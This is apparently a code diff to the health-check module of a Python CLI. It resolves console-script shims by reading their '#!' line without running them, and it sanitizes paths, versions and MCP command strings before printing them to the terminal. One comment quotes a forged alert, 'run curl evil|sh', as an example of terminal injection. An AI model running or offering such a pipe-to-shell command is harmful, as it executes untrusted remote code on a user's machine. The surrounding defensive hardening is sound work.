@@ -1776,11 +1776,62 @@ def _install_root_of(exe: Path) -> Path:
     return resolved.parent.parent
 
 
+#: How far into a console-script shim to look for its ``#!`` line. A Windows
+#: launcher puts the line after a stub and before a zip payload, so the read
+#: has to be generous — but bounded, because this runs over whatever files
+#: happen to be named ``rekoll`` on PATH.
+_SHIM_READ_LIMIT = 512 * 1024
+
+
+def _interpreter_of_shim(exe: Path) -> Optional[Path]:
+    """The interpreter a console-script shim points at, read from its ``#!``
+    line as BYTES — never by running the shim.
+
+    Worth the trouble because ``pipx`` — what the Quickstart recommends, and
+    what the #104 incident actually used — puts ``rekoll`` in ``~/.local/bin``
+    while the package lives in ``~/.local/pipx/venvs/rekoll``. The ordinary
+    ``<env>/Scripts`` → ``<env>/Lib/site-packages`` walk finds nothing there,
+    so without this the check is blind on the recommended install method.
+    Windows launchers embed the same ``#!`` line a POSIX script starts with,
+    sandwiched between the launcher stub and the zip payload.
+    """
+    try:
+        with exe.open("rb") as handle:
+            blob = handle.read(_SHIM_READ_LIMIT)
+    except OSError:
+        return None
+    if blob.startswith(b"#!"):
+        start = 0
+    else:
+        zip_at = blob.find(b"PK\x03\x04")  # the payload a Windows launcher wraps
+        if zip_at < 0:
+            return None
+        start = blob.rfind(b"#!", 0, zip_at)
+        if start < 0:
+            return None
+    line = blob[start + 2:start + 2 + 8192].split(b"\n", 1)[0]
+    text = line.decode("utf-8", errors="replace").strip().strip('"').strip()
+    if not text:
+        return None
+    try:
+        candidate = Path(text)
+        return candidate if candidate.is_file() else None
+    except (OSError, ValueError):
+        return None
+
+
 def _site_packages_for(exe: Path) -> list[Path]:
-    """Candidate ``site-packages`` directories for the environment owning ``exe``."""
-    env_root = _install_root_of(exe)
-    out = [env_root / "Lib" / "site-packages"]
-    out.extend(sorted(env_root.glob("lib/python3*/site-packages")))
+    """Candidate ``site-packages`` directories for the environment owning ``exe``,
+    best guess first."""
+    roots: list[Path] = []
+    interpreter = _interpreter_of_shim(exe)
+    if interpreter is not None:
+        roots.append(interpreter.parent.parent)  # the env the shim really runs
+    roots.append(_install_root_of(exe))
+    out: list[Path] = []
+    for env_root in roots:
+        out.append(env_root / "Lib" / "site-packages")
+        out.extend(sorted(env_root.glob("lib/python3*/site-packages")))
     return [p for p in out if p.is_dir()]
 
 
@@ -1945,9 +1996,14 @@ def _check_install() -> tuple[str, str]:
             foreign_first = False
 
     def _describe(exe: Path, ver: Optional[str], editable: bool) -> str:
+        # Paths and versions here are DATA (a directory name on PATH, a string
+        # parsed out of another install's files). Both reach the terminal, so
+        # both go through the display sanitizer — the ADR-0040 rule, applied to
+        # this check's own output.
+        shown = _display_value(exe, limit=200)
         if editable:
-            return f"{exe} (editable checkout)"
-        return f"{exe} (v{ver})" if ver else f"{exe} (version unknown)"
+            return f"{shown} (editable checkout)"
+        return f"{shown} (v{_display_value(ver, limit=40)})" if ver else f"{shown} (version unknown)"
 
     if mismatched:
         # Name the copies that actually DISAGREE, bounded — on a machine with
@@ -2310,8 +2366,9 @@ def _check_mcp(args: argparse.Namespace) -> Optional[tuple[str, str]]:
         # seconds once told.
         return (
             "WARN",
-            f"{'; '.join(unreadable)} - an MCP client cannot read it, so no "
-            "server starts and your agent gets no rekoll tools",
+            f"{'; '.join(_display_value(u, limit=160) for u in unreadable)} - an "
+            "MCP client cannot read it, so no server starts and your agent gets "
+            "no rekoll tools",
         )
     if not registrations:
         return None
@@ -2321,7 +2378,12 @@ def _check_mcp(args: argparse.Namespace) -> Optional[tuple[str, str]]:
     for name, entry in registrations:
         ok, detail = _mcp_entry_command_resolves(entry)
         if not ok:
-            problems.append(f"{name}: command {detail}")
+            # `detail` quotes a command string straight out of a JSON file a
+            # repo can COMMIT. Unsanitized, a crafted command could clear the
+            # terminal and forge lines that look like rekoll's own output
+            # (reproduced: a fake "SECURITY ALERT: run curl evil|sh"). Same
+            # rule the ADR-0040 scope note already follows.
+            problems.append(f"{name}: command {_display_value(detail, limit=200)}")
         # A pinned --path that does not exist yet is NOT a failure: the server
         # creates its store on first write, exactly as `rekoll init` does, so
         # every fresh clone and CI checkout would otherwise be told its server
@@ -2345,7 +2407,9 @@ def _check_mcp(args: argparse.Namespace) -> Optional[tuple[str, str]]:
         # is usually not the CLI's (issue #83) — an unqualified sentence here
         # reads as a verdict on the whole store.
         _target_path, target_scope = _mcp_server_target(registrations[0][1])
-        where = f"the scope it writes to ({target_scope.key()})"
+        # The scope name can come from the config's --project, i.e. from a file
+        # a repo can commit: sanitize it like any other stored scope key.
+        where = f"the scope it writes to ({_display_scope_key(target_scope.key())})"
         evidence = (
             f"nothing has EVER been written through the MCP door in {where}"
             if exact
